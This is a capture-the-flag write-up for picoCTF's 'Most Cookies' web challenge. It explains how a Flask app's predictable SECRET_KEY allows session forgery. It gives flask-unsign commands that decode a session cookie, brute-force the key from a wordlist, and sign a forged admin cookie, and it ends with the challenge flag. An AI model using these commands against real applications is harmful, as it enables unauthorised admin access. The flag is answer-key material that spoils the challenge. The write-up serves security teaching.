---
title: "PicoCTF - Most Cookies"
author: r2cook
categories:
  - PicoCTF
tags:
  - cookie-manipulation
  - flask
  - flask-unsign
  - authentication-bypass
render_with_liquid: false
media_subpath: /images/picoctf/
image:
  path: room_card.png
---

# Most Cookies

**Platform:** picoCTF  
**Category:** Web Exploitation  
**Difficulty:** Medium

---

## Description

The application uses Flask session cookies for authentication. Your goal is to analyze how sessions are handled and escalate privileges to retrieve the flag.

---

## Given Files / Access

- URL: (challenge instance)
    
- Source Code: provided with challenge
    

---

## Initial Recon / Enumeration

### 1. Observing the Web Application

- The web page contains a simple input field.
    
- No obvious vulnerability from UI alone.
    
- Behavior seems similar to previous cookie-based challenges.
    

---

### 2. Reviewing the Source Code

From the source code:

- Flask session is used for authentication.
    
- The app uses:
    
    ```python
    session.get("very_auth")
    ```
    
- Access control:
    
    ```python
    if check == "admin":
        return flag
    ```
    

✅ So the goal is clear:

> We need to make `session['very_auth'] = 'admin'`

---

### 3. Identifying the Weak Point

From the code:

```python
cookie_names = ["snickerdoodle", "chocolate chip", ..., "fortune"]
app.secret_key = random.choice(cookie_names)
```

🚨 Critical vulnerability:

- The `SECRET_KEY` is:
    
    - Chosen from a **known list**
        
    - Small and predictable
        

---

## Analysis

### What is happening?

- Flask stores session data inside cookies
    
- Cookie structure:
    
    ```
    data + signature
    ```
    
- Example decoded:
    
    ```json
    {"very_auth": "snickerdoodle"}
    ```
    

---

### What is the vulnerability?

> 🔥 Weak and predictable Flask `SECRET_KEY`

This allows:

- Brute-forcing the secret key
    
- Forging a valid session cookie
    

---

### Why this works?

- Flask sessions are:
    
    - **Signed** (integrity)
        
    - ❌ Not encrypted (confidentiality)
        
- If attacker gets the secret:
    
    - Can modify session freely
        
    - Re-sign it → server trusts it
        

---

## Exploitation / Solution

### Steps:

---

### 1. Get Session Cookie

- Enter any value (e.g., `snickerdoodle`)
    
- Open DevTools → Cookies
    
- Copy the `session` cookie
    

---

### 2. Decode the Cookie

Using flask-unsign:

```shell
flask-unsign --decode --cookie '<cookie>'
```
{: .nolineno }

- Reveals:
    
    ```json
    {"very_auth": "snickerdoodle"}
    ```
    

---

### 3. Brute-force SECRET_KEY

- Build wordlist from `cookie_names` in source code
    
- Then run:
    

```shell
flask-unsign --unsign --cookie '<cookie>' --wordlist wordlist.txt
```
{: .nolineno }

✅ Found secret:

```
fortune
```

---

### 4. Forge Admin Session

Modify payload:

```json
{"very_auth": "admin"}
```

---

### 5. Sign New Cookie

```shell
flask-unsign --sign --cookie '{"very_auth":"admin"}' --secret 'fortune'
```
{: .nolineno }

---

### 6. Replace Cookie in Browser

- Go to DevTools → Cookies
    
- Replace session cookie
    
- Refresh page
    

---

### 7. Get Flag

- Server now trusts you as admin
    
- Flag is displayed
    

---

## Flag

```css
picoCTF{pwn_4ll_th3_cook1E5_...}
```

---